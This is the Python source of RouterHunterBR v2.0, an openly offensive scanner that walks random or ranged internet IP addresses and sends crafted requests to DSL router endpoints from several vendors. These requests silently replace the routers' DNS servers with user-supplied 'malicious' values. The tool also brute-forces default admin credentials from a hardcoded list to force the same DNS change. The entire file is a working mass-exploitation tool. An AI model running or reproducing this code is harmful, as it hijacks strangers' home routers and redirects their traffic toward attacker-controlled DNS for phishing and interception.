#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
#===============================================================================================================================================
# Scanner RouterHunterBR v2.0 - InurlBrasil Team 
# Tool used to find and perform tests in vulnerable routers on the internet.
# Facebook: https://fb.com/JhonVipNet
# Blog: http://blog.inurl.com.br - https://jh00nsec.wordpress.com
# Twitter: https://twitter.com/jh00nbr
# Github: https://github.com/jh00nbr/
# Channel: https://www.youtube.com/c/Mrsinisterboy
# Fapage InurlBrasil Team: https://fb.com/InurlBrasil
#===============================================================================================================================================

import sys
import os
import argparse
import itertools
import requests
import random
import time
import threading
import base64
import socket
from datetime import datetime
 
banner = """
	      _	          _           _		   		   
  ___ ___ _ _| |_ ___ ___| |_ _ _ ___| |_ ___ ___ 
 |  _| . | | |  _| -_|  _|   | | |   |  _| -_|  _|
 |_| |___|___|_| |___|_| |_|_|___|_|_|_| |___|_|
				       BR - v2.0

 Tool used to find and perform tests in vulnerable routers on the internet.

[ Scanner RouterHunterBR 2.0 - InurlBrasil Team - coded by Jhonathan Davi a.k.a jh00nbr - jhoonbr at protonmail.ch ]
[ twitter.com/jh00nbr - github.com/jh00nbr/ - jh00nsec.wordpress.com - blog.inurl.com.br - www.youtube.com/c/Mrsinisterboy ]

[!] legal disclaimer: Usage of RouterHunterBR for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.					
Developers assume no liability and are not responsible for any misuse or damage caused by this program	   
"""
 
# Random ips
def random_ip():
	blocoa = random.randint(0,255)
	blocob = random.randint(0,255)
	blococ = random.randint(0,255)
	blocod = random.randint(0,255)
	ip = str(blocoa) + '.' + str(blocob)+ '.' + str(blococ) + '.' + str(blocod)
	return ip
 
def range_ips(ip):
	points = ip.split('.')
	chunks = [map(int, point.split('-')) for point in points]
	ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]
	for address in itertools.product(*ranges):
		yield '.'.join(map(str, address))

# Random agent / List user-agents sqlmap: https://raw.githubusercontent.com/moonsea/injection.testcase/master/txt/user-agents.txt
def user_agent():
    ua = ['Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.0.8)', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2', 'Opera/9.21 (Windows NT 5.1; U; nl)', 'Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1', 'Opera/9.51 (X11; Linux i686; U; Linux Mint; en)', 'Opera/9.62 (Windows NT 5.1; U; tr) Presto/2.1.1','Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61', 'Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50']
    return random.choice(ua)

# Perform the connection and operation with the router.
#===============================================================================================================================================
def conectar_ip(ip,rt):
    try:
        user_agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.6) Gecko/2009011912 Firefox/3.0.6'} 
	url = "http://"+ip+rt
	response = requests.get(url,headers=user_agent, timeout=5)
	status = response.status_code
	html = response.text
	if status == 200:
	    if 'DNS Server Configuration' in html:
                print "\n" + "[ + ]" + hour() + bcolors.OKGREEN + "[ ! ] " + url + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] IP: [ " + ip + " ] | DNS1: " + dns1 + " DNS2: " + dns2  + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Status: DNS changed success" + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Cod: 200"+ bcolors.ENDC
                #print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Model: Shuttle Tech ADSL Modem-Router 915 WM or DSL_500B"+ bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] City:",info_ip(ip) + bcolors.ENDC + "\n"
                
    except:
        print "[ + ] " + hour()+ bcolors.BRED + " [ " + ip +" ] ::: [ IS NOT VULNERABLE ]"+bcolors.ENDC 
#===============================================================================================================================================


# Check Status.
#===============================================================================================================================================
def status(return_status):
	if "200" in str(return_status):
		return "200"
	else:
		return "not"
 #===============================================================================================================================================


# Returns information about the ip.
#===============================================================================================================================================
def info_ip(ip):
	import json
	get = requests.get("http://ipinfo.io/"+ip+"/json")
	json = json.loads(get.content)
	city = json['city']
	if "None" in str(city):
		return " "
	else:
		return city
 #===============================================================================================================================================

# Hour.
#===============================================================================================================================================
def hour():
	now = datetime.now()
	return str(now.day) + "/" + str(now.month) + "/" + str(now.year) + " " + str(now.hour)+":"+str(now.minute)+":"+str(now.second)
#===============================================================================================================================================

class bcolors:
	OKGREEN = '\033[92m'
	GREEN = "\033[1;32m"
	GREENUNDER	=	"\033[4;32m"
	RED = '\033[91m'
	WARNING = '\033[93m'
	BASICY = "\033[0;33m"
	YELLOW = "\033[1;33m"
	BRED = "\033[0;31m"
	RED2 = "\033[1;31m"
	UNDERLINE = '\033[4m'
	ENDC = '\033[0m'
 
def printIP(ip,route):
	print ip
#=============================================================================================================================================== 
def randIP():
	ips = random_ip()
	for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
	    conectar_ip(ips,route)

# Funcion ipRange / Reference: http://cmikavac.net/2011/09/11/how-to-generate-an-ip-range-list-in-python/
#===============================================================================================================================================
def ipRange_wildcard(start_ip, end_ip):
   start = list(map(int, start_ip.split(".")))
   end = list(map(int, end_ip.split(".")))
   temp = start
   ip_range = []
   
   ip_range.append(start_ip)
   while temp != end:
      start[3] += 1
      for i in (3, 2, 1):
         if temp[i] == 256:
            temp[i] = 0
            temp[i-1] += 1
      ip_range.append(".".join(map(str, temp)))      
   return ip_range
#===============================================================================================================================================
#Port check.
#===============================================================================================================================================
def port_check(ip,port):
    try:
        socke = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socke.settimeout(0.5)
        result = socke.connect((ip,port))
        if "None" in str(result):
            return True
            socke.close()
        else:
            return False
    except:
        pass 
#===============================================================================================================================================

#Bruteforce router.
#===============================================================================================================================================
def bruteforce_router(ip,user,password,route):
    if port_check(ip,80):
        try:
            data = base64.b64encode(user+":"+password)
            auth = {'Authorization': "Basic "+ data}
            url = "http://"+ip+route
	    get = requests.get(url, headers=auth, timeout=5)	        
	    if "200" in str(get.status_code):
                print "\n" + "[ + ]" + hour() + bcolors.OKGREEN + "[ ! ] " + url + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] IP: [ " + ip + " ] | DNS1: " + dns1 + " DNS2: " + dns2  + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Status: DNS changed success! [Bruteforce]" + bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Cod: 200"+ bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] Model: DSLink_260E"+ bcolors.ENDC
                print "[ + ] " + hour() + bcolors.OKGREEN + "[ ! ] City:",info_ip(ip) + bcolors.ENDC + "\n\n"
        except:
             
            pass
    else:
        return False        
#===============================================================================================================================================

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='The Routerhunter was designed to run over the Internet looking for defined ips tracks or random in order to automatically exploit the vulnerability DNSChanger on home routers.', prog='Routerhunter', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
	parser.add_argument("-range", "--range", help="Set range of IP", metavar= "192.168.1.0-255", default="", required=False)
	parser.add_argument("-bruteforce", "--bruteforce", help = "Brute force with users and passwords on routers that requires authentication, forcing alteration of dns.", action="store_true")
	parser.add_argument("-startip", "--startip", help="Start - IP range customized with wildcard / 201.*.*.*", metavar= "192.168.*.*", default="", required=False)
	parser.add_argument("-endip", "--endip", help="End - IP range customized with wildcard / 201.*.*.*", metavar= "192.168.*.*", default="", required=False)
	parser.add_argument("-dns1", "--dns1", help = "Define malicious dns1", metavar= "8.8.8.8", default="8.8.8.8", required=True)
	parser.add_argument("-dns2", "--dns2", help = "Define malicious dns2", metavar= "8.8.4.4", default="8.8.4.4", required=True)
	parser.add_argument("--threads", help = "Set threads numbers", metavar= "10", default=1)
	parser.add_argument("-rip", "--randomip", help = "Randomizing ips routers", action="store_true")
	parser.add_argument("-lmtip", "--limitip", help = "Define limite random ip", metavar= "10", default=1)
	args = parser.parse_args()
	dns1 = args.dns1 #dns1
	dns2 = args.dns2 #dns2
	rngip = args.range # Rangeip
	start_rangeip = args.startip # Start ip asterisk
        end_rangeip = args.endip # End ip asterisk
	MAX_CONEXOES = args.threads
	lmt = args.limitip # Limit IP
 
	# GET vulnerable routers.
	#===============================================================================================================================================
	shuttle = "/dnscfg.cgi?dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1"
        DSL_2780B = "/dnscfg.cgi?dnsSecondary="+dns2+"&dnsIfcsList=&dnsRefresh=1"
        DSL_2730B = "/dnscfg.cgi?dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1&dnsIfcsList="
        DSL_526B = "/dnscfg.cgi?dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1"
	DLink_2740R = "/dns_1?Enable_DNSFollowing=1&dnsPrimary="+dns1+"&dnsSecondary="+dns2
	DLink_2640B = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary="+dns1+"&dnsSecondary="+dns2+"&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP"
	dns1_explode = dns1.split(".")
   
        # DSLink 260E - Exploiting - Defaut Passwords DNS Change / https://www.youtube.com/watch?v=tNjy91g2Rak
        DSLink_260E = "/Action?dns_status=1&dns_poll_timeout=2&id=57&dns_server_ip_1="+dns1_explode[0]+"&dns_server_ip_2="+dns1_explode[1]+"&dns_server_ip_3="+dns1_explode[2]+"&dns_server_ip_4="+dns1_explode[3]+"&priority=0&cmdAdd=Add"
        #===============================================================================================================================================
    
        # Pre usernames and passwords set for brute force.
        #===============================================================================================================================================
        users = ["admin", "root", "adm", "root","support", "tech", "", "security", "User", "comcast", "user", "monitor", "Administrator", "operator", "admn", "D-Link", "sysadm", "super", "!root", "ctbc", "su", "TMAR#DLKT20060313", "TMAR#DLKT20060307", "TMAR#DLKT20090202", "TMAR#DLKT20050227", "TMAR#DLKT20050516", "TMAR#DLKT20050227", "TMAR#DLKT20050519", "TMAR#DLKT20050516", "TMAR#DLKT20060627", "TMAR#DLKT20060205", "TMARDLKT93319", "sysadmin", "telecom"]
        passwords = ["admin", "password", "root", "", "1234", "gvt12345", "teste", "", "1234", "1212", "supportuser", "s85Tcf", "normaluser", "parks", "Administrator", "administrator", "blank"]
        #===============================================================================================================================================

	if '*' in start_rangeip or '*' in end_rangeip:
            os.system('clear')
            print banner
            print "\n\n[*] Testing started in range: [ "+start_rangeip+" ] at [ " + hour() + " ]\n"
            ip1 = start_rangeip.replace('*', str(0)) 
            ip2 = end_rangeip.replace('*', str(255)) 
            for ip in ipRange_wildcard(ip1,ip2):
                for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
		    lista_threads = []
		    while threading.active_count() > MAX_CONEXOES:
		        print("Esperando 1s...")
			time.sleep(1)
		    thread = threading.Thread(target=conectar_ip, args=(ip,route))
		    lista_threads.append(thread)
		    thread.start()
	        for thread in lista_threads:
	            thread.join()

	if args.range:
            if args.bruteforce:
                os.system('clear')
                print banner
                print "\n\n[*] Bruteforce started in routers: [ "+rngip+" ] at [ " + hour() + " ]\n"
                for ips in range_ips(rngip):
	            if port_check(ips,80):
	                for user in users:
                            for password in passwords:
                                for route in [DSLink_260E]:
		                    lista_threads = []
		                    while threading.active_count() > MAX_CONEXOES:	            
			                time.sleep(1)
		                    thread = threading.Thread(target=bruteforce_router, args=(ips,user,password,route))
		                    lista_threads.append(thread)
	                            thread.start()
	                    for thread in lista_threads:
                                thread.join()

	    else:	     
                os.system('clear')
                print banner
                print "\n\n[*] Testing started in range: [ "+rngip+" ] at [ " + hour()+ " ]\n"
	        for ips in range_ips(rngip):
                    for route in [shuttle, DLink_2740R, DLink_2640B, DSL_2780B, DSL_2730B, DSL_526B]:
		        lista_threads = []
		        while threading.active_count() > MAX_CONEXOES:
		            print("Esperando 1s...")
	                    time.sleep(1)
                        thread = threading.Thread(target=conectar_ip, args=(ips,route))
	                lista_threads.append(thread)
                        thread.start()
	            for thread in lista_threads:
	                thread.join()
 
	if args.randomip:
            os.system('clear')
            print banner
            print "\n\n[*] Testing started in random ips! at [ "+ hour() + " ]\n"
	    valida = 0
	    for valida in range(int(lmt)):
                lista_threads = []
		while threading.active_count() > MAX_CONEXOES:
	            print("Esperando 1s...")
		    time.sleep(1)
		thread = threading.Thread(target=randIP, args=())
		lista_threads.append(thread)
		thread.start()
	    for thread in lista_threads:
                thread.join()        
